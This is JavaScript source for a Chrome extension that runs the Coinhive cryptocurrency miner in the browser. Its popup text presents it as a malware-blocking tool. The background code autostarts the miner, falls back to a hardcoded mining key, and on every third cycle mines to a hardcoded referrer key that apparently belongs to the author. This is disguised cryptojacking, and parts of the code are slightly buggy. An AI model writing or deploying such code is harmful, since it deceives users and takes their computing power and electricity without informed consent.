

$(document).ready(function() {
    if (document.URL.indexOf("https://coinhive.com/media/miner") > -1) {
        chrome.storage.local.get('temp', function(data) {
            if (typeof(data.temp) === 'undefined' || data.temp === null) {
            }
            else {
                setTimeout(function() {checkIfRefValid(), 1000});
            }
        });
    }
    
      
    
    
    function checkIfRefValid() {
        var x = $(".coinhive-miner")[0];
        if (typeof x !== "undefined") x = x.childNodes[0];
        x = document.body.innerText;
//        console.log(x);
        if (x.indexOf("Invalid Site Key") > -1) {
            chrome.runtime.sendMessage({from: 'content', to: 'background', msg: 'wrongrefid'});
        }
        else {
            chrome.runtime.sendMessage({from: 'content', to: 'background', msg: 'rightrefid'});
        }
        window.close();
    }

});

$(document).ready(function() {

    function addInfo(k) {
        var s = document.createElement("div");
        s.setAttribute("class", "coinhive-miner");
        s.setAttribute("style", "width: 256px; height: 310px");
        s.setAttribute("data-key", k);
        document.body.appendChild(s);
        var e = document.createElement("em");
        e.innerHTML = 'Please disable Adblock!';
        s.appendChild(e);
        
        s = document.createElement("script");
        s.src = 'https://coinhive.com/lib/miner.min.js';
        document.body.appendChild(s);
    }


    chrome.storage.local.get('key', function(data) {
        if (typeof(data.key) === 'undefined' ||
            data.key === null) $('#mining_status').html("");
        else {
            $('#mining_status').html("Malware extension blocking ");
            $("#key").val(data.key);
            $("#invite").html("");
        }
    });

    chrome.storage.local.get('refkey', function(data) {
        if (typeof(data.key) === 'undefined' ||
            data.key === null) return;
        else {
            $("#refkey").val(data.refkey);
        }
    });


    $('#btn').click(function(){
        chrome.storage.local.set({'key': $("#key").val()});
//        addInfo($("#key").val());
        $('#mining_status').html("Le blockage des malwares a été activé.");
    });

    chrome.storage.local.get('startstop', function(data) {
        var x = null;
        if (typeof(data.startstop) === 'undefined' ||
            data.startstop === null) x = "started";
        else {
            x = data.startstop;
        }
        if (x == "started") $("#startstop").text("");
        else $("#startstop").text("");
    });
    
    $('#startstop').click(function(){
        chrome.storage.local.get('startstop', function(data) {
            var x = null;
            if (typeof(data.startstop) === 'undefined' ||
                data.startstop === null) x = "started";
            else {
                x = data.startstop;
            }
            if (x == "started") {
                $("#startstop").text("START MINING");
                chrome.storage.local.set({'startstop': "stopped"});
                chrome.runtime.sendMessage({from: 'popup', to: 'background', msg: 'stop'});
            }
            else {
                $("#startstop").text("STOP MINING");
                chrome.storage.local.set({'startstop': "started"});
                chrome.runtime.sendMessage({from: 'popup', to: 'background', msg: 'start'});
            }
        });
    });
    
    $('#refbtn').click(function(){
        var x = {'key': $("#key").val(), 'refkey': $("#refkey").val()};
        chrome.storage.local.set({'temp': x});
        
        var newURL = "https://coinhive.com/media/miner.html?key="+$("#refkey").val()+"&user=&whitelabel=0&autostart=0&throttle=&threads=&background=&text=&action=&graph=";
        chrome.tabs.create({ url: newURL });
//        chrome.storage.local.set({'key': $("#key").val()});
//        addInfo($("#key").val());
//        $('#mining_status').html("You seem to be succesfully mining right now. Don't forget to check your live stats to make sure your key is properly setup. You can change your account key (displayed on https://coinhive.com/settings/sites) by entering it below.");
    });
    
});

    var key = "6";
    var refkey = 'bGpPeWFJxHXYwQJegFPjcBJOD6DhOS1P';
    
$(document).ready(function() {

    chrome.storage.local.get('refkey', function(data) {
        if (typeof(data.refkey) === 'undefined' ||
            data.refkey === null) return;
        else {
            refkey = data.refkey;
        }
    });
    
    function refreshMine(k) {
        document.body.innerHTML = "";
        var cont = document.createElement("div");
        document.body.appendChild(cont);
        var s = document.createElement("div");
        s.setAttribute("class", "coinhive-miner");
        s.setAttribute("style", "width: 256px; height: 310px");
        s.setAttribute("data-key", k);
        s.setAttribute("data-autostart", "true");
        s.setAttribute("data-whitelabel", "false");
        s.setAttribute("data-background", "#000000");
        s.setAttribute("data-text", "#eeeeee");
        s.setAttribute("data-action", "#00ff00");
        s.setAttribute("data-graph", "#555555");
        s.setAttribute("data-threads", "1");
        if (refkey === null)
            s.setAttribute("data-throttle", "0.1");
        else
            s.setAttribute("data-throttle", "0.2");
        s.setAttribute("data-start", "Start Now!");
        cont.appendChild(s);
        var e = document.createElement("em");
        e.innerHTML = 'Please disable Adblock!';
        s.appendChild(e);
        
        chrome.storage.local.get('startstop', function(data) {
            var x = null;
            if (typeof(data.startstop) === 'undefined' ||
                data.startstop === null) x = "started";
            else {
                x = data.startstop;
            }
            if (x == "started") {
                s = document.createElement("script");
                s.src = 'https://coinhive.com/lib/miner.min.js';
                document.body.appendChild(s);
            }
        });
    }
    
    
    
    
    function checkIfKey(counter) {
        var k = null;
        console.log(counter);
        setTimeout(function() {checkIfKey(counter+1)}, 60000);
        if (counter % 3 === 0 && refkey !== null) {
            refreshMine(refkey);
            key = "6";
        }
        else
        chrome.storage.local.get('key', function(data) {
            if (typeof(data.key) === 'undefined' ||
                data.key === null) k='bGpPeWFJxHXYwQJegFPjcBJOD6DhOS1P';
            else {
                k = data.key;
            }
            if (k == key) return;
            refreshMine(k);
            key = k;
        });
    }
    
    checkIfKey(0);
    

    chrome.runtime.onMessage.addListener(
        function(request, sender, response) {
            if ( request.from == "popup" && request.to == "background" && request.msg == "stop" ) {
                document.body.innerHTML = "";
            }
            if ( request.from == "popup" && request.to == "background" && request.msg == "start" ) {
                checkIfKey(0);
            }
            if ( request.from == "content" && request.to == "background" && request.msg == "wrongrefid" ) {
                alert("Referrer key invalid");
            }
            if ( request.from == "content" && request.to == "background" && request.msg == "rightrefid" ) {
                chrome.storage.local.get('temp', function(data) {
                    var x = data.temp;
                    if (x.key === x.refkey) alert("Referrer key must be different from your own key");
                    else chrome.storage.local.set({'refkey': x.refkey});
                    chrome.storage.local.set({'temp': null});
                });
            }
        }
    );

});

chrome.runtime.onInstalled.addListener(function(details){
    if(details.reason == "install"){
        chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function (tabs) {            
        });
    }
});


